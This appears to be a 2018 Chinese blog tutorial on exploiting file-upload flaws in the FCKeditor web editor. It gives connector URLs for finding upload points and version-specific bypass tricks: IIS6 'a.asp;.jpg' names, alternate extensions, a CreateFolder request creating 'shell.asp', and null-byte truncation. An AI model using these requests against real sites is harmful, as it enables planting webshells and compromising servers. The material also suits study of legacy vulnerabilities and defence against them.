@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>上传漏洞fckeditor的利用 | welcome to here</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="fckeditor简介">
+<meta property="og:type" content="article">
+<meta property="og:title" content="上传漏洞fckeditor的利用">
+<meta property="og:url" content="http://yoursite.com/2018/01/08/上传漏洞fckeditor的利用/index.html">
+<meta property="og:site_name" content="welcome to here">
+<meta property="og:description" content="fckeditor简介">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1fn96kwsuboj308808c74e.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1fn96x9ehs7j30lg07jdhn.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fn96t5waidj30g508qgmu.jpg">
+<meta property="og:updated_time" content="2018-01-08T07:36:00.328Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="上传漏洞fckeditor的利用">
+<meta name="twitter:description" content="fckeditor简介">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1fn96kwsuboj308808c74e.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="welcome to here" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">welcome to here</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-上传漏洞fckeditor的利用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/08/上传漏洞fckeditor的利用/" class="article-date">
+  <time datetime="2018-01-08T05:51:00.000Z" itemprop="datePublished">2018-01-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      上传漏洞fckeditor的利用
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="fckeditor简介"><a href="#fckeditor简介" class="headerlink" title="fckeditor简介"></a>fckeditor简介</h1><a id="more"></a>
+<p>   FCKeditor是一个专门使用在网页上属于开放源代码的所见即所得文字编辑器。它志于轻量化，不需要太复杂的安装步骤即<br>可使用。它可和PHP、 JavaScript、ASP、ASP.NET、ColdFusion、Java、以及ABAP等不同的编程语言相结合。</p>
+<h1 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h1><h2 id="判断当前fck版本"><a href="#判断当前fck版本" class="headerlink" title="判断当前fck版本"></a>判断当前fck版本</h2><pre><code>使用方法在含有fckeditor的网址后面加入_whatsnew.html或者editor/dialog/fck_about.html
+</code></pre><h2 id="找上传地址"><a href="#找上传地址" class="headerlink" title="找上传地址"></a>找上传地址</h2><pre><code>常用的上传地址有如下几种：
+1.FCKeditor/editor/filemanager/browser/default/connectors/test.html
+
+2.FCKeditor/editor/filemanager/browser/default/connectors/test.html
+
+3.FCKeditor/editor/filemanager/connectors/test.html
+
+4.FCKeditor/editor/filemanager/connectors/test.html
+
+5.FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
+
+6.FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
+
+7.FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php
+
+8.FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp
+</code></pre><p>如果嫌这样手工找太麻烦也可以使用<a href="https://pan.baidu.com/s/1mitcXgW" target="_blank" rel="noopener">工具</a>来帮你寻找判断<br><img src="http://ww3.sinaimg.cn/large/0069oIoUgy1fn96kwsuboj308808c74e.jpg" alt="image"></p>
+<h2 id="上传方法"><a href="#上传方法" class="headerlink" title="上传方法"></a>上传方法</h2><pre><code>1.fckeditor在2.2版本下：apache和linux环境下可以在上传文件后面加上. 来突破。
+
+2.小于2.4版本的File参数时为黑名单验证，可以通过上传.asa、.cer、.asp;.jpg(针对IIS6)。如果asa、cer不被解析，
+  还可以传.asp[空格]。传的方法就是抓包然后在数据包里的文件名后填个空格
+
+3.2.5.x和2.6.x：如果是IIS6.0 ，可以通过突破变”.”为”_”限制创建.asp文件夹，代码如下：
+ Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=%2Fshell.asp&amp;NewFolderName=z.asp
+ 也可以在上传文件的时候进行抓包，修改包中的路径信息将%2F（/）改为/a.asp就会自动创建一个a.asp的文件夹，然后在文件夹中上传图片。
+</code></pre><p> <img src="http://ww3.sinaimg.cn/large/0069oIoUgy1fn96x9ehs7j30lg07jdhn.jpg" alt="image"></p>
+<pre><code>4.对于php来说可以通过写一个能够对fckeditor提交表单文件的html文件，但应用版本是fck2.4一下方法如下截图。
+</code></pre><p> <img src="http://ww4.sinaimg.cn/large/0069oIoUgy1fn96t5waidj30g508qgmu.jpg" alt="image"></p>
+<pre><code>5.上传两次a.asp;.jpg,来绕过
+
+6.通过将上传的文件改为a.asp%00.txt用00截断的方式来做。
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/01/08/上传漏洞fckeditor的利用/" data-id="cjep9mrp1000gzco0fa4hjb69" class="article-share-link">Teilen</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/01/19/xss简介/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          xss学习
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/01/07/木马制作及服务器上传漏洞/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">木马制作及服务器上传漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/03/12/csrf学习/">web学习</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/10/sql注入的预防/">sql注入的预防</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/06/渗透测试流程-1/">渗透测试流程</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/19/xss简介/">xss学习</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/08/上传漏洞fckeditor的利用/">上传漏洞fckeditor的利用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 BlackManba<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
